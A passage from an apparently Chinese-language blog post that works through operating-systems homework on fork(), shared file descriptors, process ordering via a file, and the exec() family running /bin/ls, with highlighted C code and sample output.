    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"子进程的x:%d\n"</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
    x <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"子进程的新x:%d\n"</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>rc <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"父进程的x:%d\n"</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
    x <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"父进程的新x:%d\n"</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>输出：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">父进程的x:100
父进程的新x:13
子进程的x:100
子进程的新x:30<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>结果符合预期</p>
<h2 id="第2题"><a href="#第2题" class="headerlink" title="第2题"></a><strong>第2题</strong></h2><blockquote>
<p>编写一个打开文件的程序（使用 open()系统调用），然后调用 fork()创建一个新进程。<br>子进程和父进程都可以访问 open()返回的文件描述符吗？当它们并发（即同时）写入文件时，<br>会发生什么？</p>
</blockquote>
<p>用系统调用写程序真是……很“享受”了</p>
<p>先复习一下open函数：</p>
<p><code>int open(const char *pathname, int flags, mode_t mode);</code></p>
<p>比如：</p>
<p><code>int fd = open(&quot;test.txt&quot;, O_WRONLY | O_CREAT | O_TRUNC, 0644);</code></p>
<p>含义就是，只写、不存在则创建、存在则清空的方式打开test.txt，创建新文件则以0644的权限，即创建者可读写其余只读</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;fcntl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> O_WRONLY <span class="token operator">|</span> O_CREAT <span class="token operator">|</span> O_TRUNC<span class="token punctuation">,</span> <span class="token number">0644</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> rc <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg1 <span class="token operator">=</span> <span class="token string">"hello world\n"</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg2 <span class="token operator">=</span> <span class="token string">"aloha world\n"</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>rc <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"子进程写入%d字节\n"</span><span class="token punctuation">,</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> msg1<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>msg1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>rc <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"父进程写入%d字节\n"</span><span class="token punctuation">,</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> msg2<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>msg1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行结果：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">父进程写入12字节
子进程写入12字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br><pre class="line-numbers language-test.txt" data-language="test.txt"><code class="language-test.txt">aloha world
hello world<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>结果表明文件标识符都可以使用，且同步的写入都执行了，没遇到冲突</p>
<h2 id="第3题"><a href="#第3题" class="headerlink" title="第3题"></a><strong>第3题</strong></h2><blockquote>
<p>用 fork()编写另一个程序。子进程应打印“hello”，父进程应打印“goodbye”。你<br>应该尝试确保子进程始终先打印。你能否不在父进程调用 wait()而做到这一点呢？</p>
</blockquote>
<p>正常来说wait就是用来控制顺序的，使用wait就是最好的办法。如果不使用wait的话，就需要两个进程有一些交流。</p>
<p>进程间通信，也就是IPC机制，除了wait还有信号，管道，或者共享内存等等</p>
<p>对此题来说，也许还可以简单粗暴地sleep一个足够长的时间，比如1s？</p>
<p>但是上一题暗示我们还可以利用磁盘（文件）实现交流，虽然冷门了点，但试试还是很有趣的，不是吗：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> O_RDWR <span class="token operator">|</span> O_CREAT <span class="token operator">|</span> O_TRUNC<span class="token punctuation">,</span> <span class="token number">0644</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">int</span> rc <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 子进程</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hello\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg <span class="token operator">=</span> <span class="token string">"OK"</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fsync</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 父进程</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token class-name">ssize_t</span> bytes_read<span class="token punctuation">;</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token comment">// 重置文件指针到开头</span>
      <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">SEEK_SET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"goodbye\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>因为交流简单，写得糙了点。文件要以读写权限打开，以及注意读完要回到开头</p>
<h2 id="第4题"><a href="#第4题" class="headerlink" title="第4题"></a><strong>第4题</strong></h2><blockquote>
<p>编写一个调用 fork()的程序，然后调用某种形式的 exec()来运行程序/bin/ls。看看是 否可以尝试 exec()的所有变体，包括 execl()、execle()、execlp()、execv()、execvp()和 execvP()。<br>为什么同样的基本调用会有这谁多变种？</p>
</blockquote>
<p>这题……交给大模型了:<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span>

<span class="token keyword">void</span> <span class="token function">test_execl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"=== 测试 execl() ===\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"execl() 接受一个参数列表，以 NULL 结尾\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">int</span> rc <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 子进程：使用 execl</span>
        <span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"/bin/ls"</span><span class="token punctuation">,</span> <span class="token string">"ls"</span><span class="token punctuation">,</span> <span class="token string">"-l"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 如果执行到这里说明 exec 失败了</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"execl failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 父进程：等待子进程结束</span>
        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"execl() 测试完成\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"fork failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">test_execle</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"=== 测试 execle() ===\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"execle() 接受一个参数列表和环境变量数组\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PATH=/bin:/usr/bin"</span><span class="token punctuation">,</span> <span class="token string">"USER=testuser"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token keyword">int</span> rc <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 子进程：使用 execle</span>
        <span class="token function">execle</span><span class="token punctuation">(</span><span class="token string">"/bin/ls"</span><span class="token punctuation">,</span> <span class="token string">"ls"</span><span class="token punctuation">,</span> <span class="token string">"-l"</span><span class="token punctuation">,</span> <span class="token string">"/tmp"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"execle failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"execle() 测试完成\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"fork failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">test_execlp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"=== 测试 execlp() ===\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"execlp() 接受一个参数列表，在 PATH 中查找程序\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">int</span> rc <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 子进程：使用 execlp（不需要完整路径）</span>
        <span class="token function">execlp</span><span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">,</span> <span class="token string">"ls"</span><span class="token punctuation">,</span> <span class="token string">"-l"</span><span class="token punctuation">,</span> <span class="token string">"/usr"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"execlp failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"execlp() 测试完成\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"fork failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">test_execv</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"=== 测试 execv() ===\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"execv() 接受一个参数数组\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">char</span> <span class="token operator">*</span>args<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"ls"</span><span class="token punctuation">,</span> <span class="token string">"-l"</span><span class="token punctuation">,</span> <span class="token string">"/home"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token keyword">int</span> rc <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 子进程：使用 execv</span>
        <span class="token function">execv</span><span class="token punctuation">(</span><span class="token string">"/bin/ls"</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"execv failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"execv() 测试完成\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"fork failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">test_execvp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"=== 测试 execvp() ===\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"execvp() 接受一个参数数组，在 PATH 中查找程序\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">char</span> <span class="token operator">*</span>args<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"ls"</span><span class="token punctuation">,</span> <span class="token string">"-l"</span><span class="token punctuation">,</span> <span class="token string">"/var"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token keyword">int</span> rc <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 子进程：使用 execvp（不需要完整路径）</span>
        <span class="token function">execvp</span><span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"execvp failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"execvp() 测试完成\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"fork failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">test_execvpe</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"=== 测试 execvpe() ===\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"execvpe() 接受一个参数数组、在 PATH 中查找程序，并指定环境变量\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"注意：这个函数可能在某些系统上不可用\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">char</span> <span class="token operator">*</span>args<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"ls"</span><span class="token punctuation">,</span> <span class="token string">"-l"</span><span class="token punctuation">,</span> <span class="token string">"/opt"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PATH=/bin:/usr/bin"</span><span class="token punctuation">,</span> <span class="token string">"USER=testuser"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token keyword">int</span> rc <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 子进程：使用 execvpe</span>
        <span class="token comment">// 注意：execvpe 在某些系统上可能不存在</span>
        <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_GNU_SOURCE</span></span>
        <span class="token function">execvpe</span><span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">,</span> args<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"execvpe() 在此系统上不可用，使用 execve() 替代\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/ls"</span><span class="token punctuation">,</span> args<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"execvpe/execve failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"execvpe() 测试完成\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"fork failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"演示各种 exec() 变体\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"===================================\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">test_execl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">test_execle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">test_execlp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">test_execv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">test_execvp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">test_execvpe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

